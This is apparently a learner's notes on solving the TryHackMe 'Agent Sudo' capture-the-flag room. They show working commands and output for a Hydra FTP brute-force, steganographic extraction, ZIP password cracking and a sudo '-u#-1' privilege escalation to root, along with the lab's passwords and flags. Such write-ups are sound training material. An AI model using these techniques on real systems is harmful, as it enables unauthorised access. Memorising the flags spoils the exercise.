> [!info]
> You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.
> Welcome to another THM exclusive CTF room. Your task is simple, capture the flags just like the other CTF room. Have Fun!

![](assets/Agent%20Sudo.png)
> [!important]
> Target IP: 10.65.183.121

> [!question]
> How many open ports?

> [!note]
> Running an nmap scan as follows revealed the relevant open ports:
> ```
> ┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- 10.65.183.121
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-07 08:20 EST
Stats: 0:00:14 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 9.17% done; ETC: 08:23 (0:02:19 remaining)
Stats: 0:00:42 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 32.13% done; ETC: 08:23 (0:01:29 remaining)
Nmap scan report for 10.65.183.121
Host is up (0.085s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
Nmap done: 1 IP address (1 host up) scanned in 118.77 seconds
> ```

> [!question]
> How you redirect yourself to a secret page?

> [!note]
> Just put the target IP in firefox and got the answer user-agent:
>![](assets/user-agent%20mainpage.png)

> [!question]
> What is the agent name?

> [!note]
> Had to get a hint and realised user-agent can be amended via firefox so used claude to help on how to change user-agent - noticed agent at bottom was named agent R so they use first letter of name only so logically I would ahve to go to A then B and then got the answer at C
> ![](assets/Agent%20Chris.png)

> [!info]
> In the extract above, not only do we learn about the name chris, we know theres a agent J and Chris has a weak password

> [!question]
> FTP password

> [!note]
> Got a hint of hail hydra from THM so searched it up and need to understand that tool for certain use case but anyway got the FTP password as crystal:
> ```
> ┌──(kali㉿kali)-[~]
└─$ hydra -l chris -P /usr/share/wordlists/rockyou.txt  ftp://10.65.183.121
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-07 08:51:11
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.65.183.121:21/
[21][ftp] host: 10.65.183.121   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-07 08:52:07
> ```

> [!question]
> Zip file password

> [!info]
> I can see the path from here and it will be to access ftp and get a zip file - once downloaded onto attack machine, use zip2john to get zip password and read contents of file. Let's see anyway

> [!note]
> hmm guess i was wrong? lets read what we have here or see...
> ```
> ftp> ls
229 Entering Extended Passive Mode (|||24980|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
> ```

> [!note]
> .txt file revealed the following:
> ```
> > ┌──(kali㉿kali)-[~]
└─$ cat To_agentJ.txt          
Dear agent J,
All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.
From,
Agent C
> ```
> and images were as follows:
> ![](assets/Alien%20images.png)
> i need to find out if images have anything useful via steganography

> [!note]
> OK used claude as I knew what I needed to do and went down a rabbit hole that led me to the ZIP password as follows:
> ```
> ┌──(kali㉿kali)-[~]
└─$ steghide extract -sf cute-alien.jpg
Enter passphrase: 
steghide: could not extract any data with that passphrase!
┌──(kali㉿kali)-[~]
└─$ zsteg cutie.png
[?] 280 bytes of extra data after image end (IEND), offset = 0x8702
extradata:0         .. file: Zip archive data, made by v6.3 UNIX, extract using at least v5.1, last modified Oct 29 2019 20:29:12, uncompressed size 86, method=AES Encrypted     
00000000: 50 4b 03 04 33 03 01 00  63 00 a6 a3 5d 4f 00 00  |PK..3...c...]O..|
00000010: 00 00 62 00 00 00 56 00  00 00 0d 00 0b 00 54 6f  |..b...V.......To|
00000020: 5f 61 67 65 6e 74 52 2e  74 78 74 01 99 07 00 02  |_agentR.txt.....|
00000030: 00 41 45 01 08 00 46 73  ca e7 14 57 90 45 67 aa  |.AE...Fs...W.Eg.|
00000040: 61 c4 cf 3a f9 4e 64 9f  82 7e 59 64 ce 57 5c 5f  |a..:.Nd..~Yd.W\_|
00000050: 7a 23 9c 48 fb 99 2c 8e  a8 cb ff e5 1d 03 75 5e  |z#.H..,.......u^|
00000060: 0c a8 61 a5 a3 dc ba bf  a6 18 78 4b 85 07 5f 0e  |..a.......xK.._.|
00000070: f4 76 c6 da 82 61 80 5b  d0 a4 30 9d b3 88 35 ad  |.v...a.[..0...5.|
00000080: 32 61 3e 3d c5 d7 e8 7c  0f 91 c0 b5 e6 4e 49 69  |2a>=...|.....NIi|
00000090: f3 82 48 6c b6 76 7a e6  50 4b 01 02 3f 03 33 03  |..Hl.vz.PK..?.3.|
000000a0: 01 00 63 00 a6 a3 5d 4f  00 00 00 00 62 00 00 00  |..c...]O....b...|
000000b0: 56 00 00 00 0d 00 2f 00  00 00 00 00 00 00 20 80  |V...../....... .|
000000c0: a4 81 00 00 00 00 54 6f  5f 61 67 65 6e 74 52 2e  |......To_agentR.|
000000d0: 74 78 74 0a 00 20 00 00  00 00 00 01 00 18 00 80  |txt.. ..........|
000000e0: 45 77 77 54 8e d5 01 00  65 da d3 54 8e d5 01 00  |EwwT....e..T....|
000000f0: 65 da d3 54 8e d5 01 01  99 07 00 02 00 41 45 01  |e..T.........AE.|
imagedata           .. text: ["+" repeated 9 times]
chunk:0:IHDR        .. file: Adobe Photoshop Color swatch, version 0, 528 colors; 1st RGB space (0), w 0x210, x 0x803, y 0, z 0; 2nd RGB space (0), w 0, x 0, y 0, z 0                                                           
chunk:1:PLTE        .. text: "8\">;&@B&A>9RO =:#<A"
┌──(kali㉿kali)-[~]
└─$ binwalk -e cutie.png
DECIMAL       HEXADECIMAL     DESCRIPTION
869           0x365           Zlib compressed data, best compression
WARNING: Extractor.execute failed to run external extractor 'jar xvf '%e'': [Errno 2] No such file or directory: 'jar', 'jar xvf '%e'' might not be installed correctly
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
WARNING: One or more files failed to extract: either no utility was found or it's unimplemented
┌──(kali㉿kali)-[~]
└─$ cd _cutie.png.extracted 
┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ ls
365  365.zlib  8702.zip
> ```

> [!important]
> Feel this is important hence the important callout - Essentially the cmds used above revealed a ZIP file hidden within the image cutie.png and cute-alien.jpg required a password. Now to extract the zip file and use zip2john with john

> [!note]
> Lets see the results
> ```
┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ unzip 8702.zip 
Archive:  8702.zip
   skipping: To_agentR.txt           need PK compat. v5.1 (can do v4.6)
┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ ls
365  365.zlib  8702.zip
┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ 7z x 8702.zip
7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_US.UTF-8 Threads:2 OPEN_MAX:1024, ASM
Scanning the drive for archives:
1 file, 280 bytes (1 KiB)
Extracting archive: 8702.zip
Path = 8702.zip
Type = zip
Physical Size = 280
Enter password (will not be echoed):
ERROR: Wrong password : To_agentR.txt
Sub items Errors: 1
Archives with Errors: 1
Sub items Errors: 1
┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ zip2john 8702.zip > hash.txt
┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ ls
365  365.zlib  8702.zip  hash.txt  To_agentR.txt
┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ cat To_agentR.txt 
┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt   
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (8702.zip/To_agentR.txt)     
1g 0:00:00:00 DONE (2026-02-07 09:21) 2.173g/s 53426p/s 53426c/s 53426C/s michael!..280789
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
> ```

> [!tldr]
> The ZIP password was alien.

> [!question]
> steg password

> [!info]
> With the unzip passphrase as alien, im hoping the extracted file will reveal the steg password but lets see.

> [!note]
> Managed to extract the file but the file revealed something which doesnt lead to the steg passphrase so unsure where to take it or what to use it on?
> ```
> ┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ 7z x 8702.zip                                            
7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_US.UTF-8 Threads:2 OPEN_MAX:1024, ASM
Scanning the drive for archives:
1 file, 280 bytes (1 KiB)
Extracting archive: 8702.zip
Path = 8702.zip
Type = zip
Physical Size = 280   
Would you like to replace the existing file:
  Path:     ./To_agentR.txt
  Size:     0 bytes
  Modified: 2019-10-29 07:29:11
with the file from archive:
  Path:     To_agentR.txt
  Size:     86 bytes (1 KiB)
  Modified: 2019-10-29 07:29:11
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? Y
Enter password (will not be echoed):
Everything is Ok
Size:       86
Compressed: 280
┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ cat To_agentR.txt 
Agent C,
We need to send the picture to 'QXJlYTUx' as soon as possible!
By,
Agent R
┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ cd ..                  
┌──(kali㉿kali)-[~]
└─$ steghide extract -sf cute-alien.jpg                      
Enter passphrase: 
steghide: could not extract any data with that passphrase!
> ```

> [!info]
> Initially thought the message was related to a user (QXJ1YTUx) but it was referring to a place which is Area51:
> ![](assets/base64%20area51.png)
>  and is the steg password also managed to get the answer to the following questions:
> > [!question]
> > Who is the other agent (in full name)? & SSH password
> > 
>```
>┌──(kali㉿kali)-[~]
└─$ steghide extract -sf cute-alien.jpg                      
Enter passphrase: 
steghide: could not extract any data with that passphrase!
┌──(kali㉿kali)-[~]
└─$ steghide extract -sf cute-alien.jpg
Enter passphrase: 
wrote extracted data to "message.txt".
┌──(kali㉿kali)-[~]
└─$ cat message.txt 
Hi james,
Glad you find this message. Your login password is hackerrules!
Don't ask me why the password look cheesy, ask agent R who set this password for you.
Your buddy,
chris
>```

> [!question]
> What is the user flag?

> [!note]
> SSH'd and immediately ran some basic commands and realised I got the POWA as you'll see and found the user flag:
> ```
> ┌──(kali㉿kali)-[~/_cutie.png.extracted]
└─$ ssh james@10.65.183.121                           
The authenticity of host '10.65.183.121 (10.65.183.121)' can't be established.
ED25519 key fingerprint is SHA256:rt6rNpPo1pGMkl4PRRE7NaQKAHV+UNkS9BfrCy8jVCA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.65.183.121' (ED25519) to the list of known hosts.
james@10.65.183.121's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)
System information as of Sat Feb  7 14:53:42 UTC 2026
System load:  0.0               Processes:           102
Usage of /:   39.9% of 9.78GB   Users logged in:     0
Memory usage: 22%               IP address for ens5: 10.65.183.121
Swap usage:   0%
75 packages can be updated.
33 updates are security updates.
Last login: Tue Oct 29 14:26:27 2019
james@agent-sudo:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User james may run the following commands on agent-sudo:
(ALL, !root) /bin/bash
james@agent-sudo:~$ ls
Alien_autospy.jpg  user_flag.txt
james@agent-sudo:~$ cat user_flag.txt 
b03d975e8c92a7c04146cfa7a5a313c7
> ```

> [!question]
> What is the incident of the photo called?

> [!note]
> Saw the image file and thought it was another steg situation but using the THM hints, I learnt to reverse image search and filter for fox news and found the answer to be Roswell alien autopsy

> [!question]
> CVE number for the escalation

> [!note]
> Using earlier knowledge about the /bin/bash, i put the following into google to see if any CVE relates to this and it did:
> ![](assets/binbash%20CVE.png)

> [!question]
> What is the root flag?

> [!info]
> Could use different way to exploit and privilege escalate so lets try a few in mind and see how I get on.

> [!note]
> Using same site I found CVE on, they gave me exact cmd to gain root shell.
> ```
> james@agent-sudo:~$ sudo -u#-1 bash
[sudo] password for james: 
root@agent-sudo:~# 
>```
>Got the root flag too.
>```
>root@agent-sudo:~# ls
Alien_autospy.jpg  user_flag.txt
root@agent-sudo:~# cd ..
root@agent-sudo:/home# cd ..
root@agent-sudo:/# ls
bin    etc             lib         mnt   run   swap.img  var
boot   home            lib64       opt   sbin  sys       vmlinuz
cdrom  initrd.img      lost+found  proc  snap  tmp       vmlinuz.old
dev    initrd.img.old  media       root  srv   usr
root@agent-sudo:/# cd root/
root@agent-sudo:/root# ls
root.txt
root@agent-sudo:/root# cat root.txt 
To Mr.hacker,
Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 
Your flag is 
b53a02f55b57d4439e3341834d70c062
By,
DesKel a.k.a Agent R
root@agent-sudo:/root# 
>```

> [!question]
> Who is Agent R?

> [!success]
> Annoyed about this cause i spent some time trying to crack shadow/passwd, checking google etc. to realise Deskel is Agent R. I thought the R was short for somehting starting with R lol.
> Anyway the answer is DesKel![](assets/Agent%20Sudo%20completed.png)


